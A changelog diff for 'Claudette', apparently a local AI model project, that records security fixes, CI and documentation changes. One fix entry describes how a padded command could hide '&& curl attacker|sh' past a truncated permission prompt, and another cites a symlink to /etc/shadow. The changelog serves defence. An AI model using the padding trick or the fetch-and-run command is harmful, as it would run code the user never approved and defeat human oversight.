@@ -70,6 +70,38 @@ bumps are non-breaking bugfixes only.
   dev layout); `CLAUDETTE_WORKSPACE` env var is the escape hatch for
   out-of-HOME workspaces (`D:\dev\…`, `/workspace/…`). Writes remain
   sandboxed to `~/.claudette/files/` unchanged.
+- **Symlink escape in `validate_read_path`.** The lexical check
+  previously accepted `~/.claudette/files/trap → /etc/shadow` because
+  normalization never resolved symlinks. Second canonical check uses
+  `fs::canonicalize` after the lexical pass; a symlinked target
+  outside allowed roots is now rejected with a clear "via symlink"
+  message. Files that don't exist yet (write targets) keep the cheap
+  lexical path.
+- **Atomic 0600 on all secret file writes.** `save_tokens` (OAuth
+  refresh/access) and `save_chat_id` previously used `fs::write`
+  (inherits umask, usually 0644) plus a follow-up `set_permissions(0o600)`
+  — a classic TOCTOU race, and `save_tokens` discarded the chmod
+  result with `let _ =` so a failed chmod was silent. New shared
+  helper `secrets::write_secret_file` uses `OpenOptions::mode(0o600)`
+  on Unix; plain write on Windows (POSIX perms don't apply). Both
+  call sites propagate errors now.
+- **Permission prompt showed only 200 chars.** `CliPrompter` previewed
+  at most 200 chars of the tool input, but the shell ran the full
+  command. A padded-front payload could hide `&& curl attacker|sh`
+  past the preview edge so the user approved one command and ran
+  another. Full input is printed now (line-wrapped, with a leading
+  char count so long ones stand out).
+- **`0.0.0.0` and `::` removed from the loopback allow-list.** These
+  are bind-addresses, not valid dialling destinations. Treating them
+  as "local" masked a real misconfiguration. Loopback now matches
+  only `localhost`, `::1`, and `127.0.0.0/8`.
+
+### Added
+
+- **Issue + PR templates** under `.github/ISSUE_TEMPLATE/` (bug report,
+  feature request, config) and `.github/PULL_REQUEST_TEMPLATE.md`.
+  Security reports route to GitHub's private advisory flow per
+  `SECURITY.md`; the PR template mirrors the three checks CI runs.
 
 ### Security
 
@@ -77,6 +109,12 @@ bumps are non-breaking bugfixes only.
   default RNG is weaker than a dedicated OS-RNG call. If the OS RNG
   fails, Claudette now refuses to fall back to weaker entropy instead
   of silently downgrading.
+
+### CI
+
+- CI runs `cargo test --lib --bins` now (was `--lib` only). The 24
+  bin tests would otherwise silently rot under PR checks. CONTRIBUTING
+  updated to keep "the three checks CI runs" honest.
 
 ### Docs
 
@@ -107,6 +145,19 @@ bumps are non-breaking bugfixes only.
   `enable_tools` schema parameter description, UTF-8 boundary test for
   the Telegram message splitter, four tests for the `<untrusted>`
   wrapper, and the `validate_read_path` workspace-env-var test).
+- **README opener rewritten** to lead with Claudette's actual pitch
+  (messaging-app + voice + local Ollama on commodity hardware) instead
+  of a feature list. Four-of-five post-ship roast agents flagged the
+  old opener as kitchen-sink; the differentiator was buried ~line 180.
+  Dangling "Sprint 8's flagship architectural decision" reference
+  replaced with a factual description of `enable_tools`.
+- **CI badge added**; `8 GB GPU` claim scoped (default brain fits;
+  Codet needs ~32 GB RAM); edge-tts's Microsoft-endpoint hit disclosed
+  in the opening paragraph; `Optional, opt-in phone-home` roadmap line
+  deleted (contradicted the local-first tagline).
+- Comment block above `[lints.clippy]` in `Cargo.toml` explains which
+  allow-lines are stylistic-preference vs plausibly fixable (the
+  `cast_*` / `struct_excessive_bools` / `missing_*_doc` family).
 
 ## [0.2.0] - 2026-04-22
 
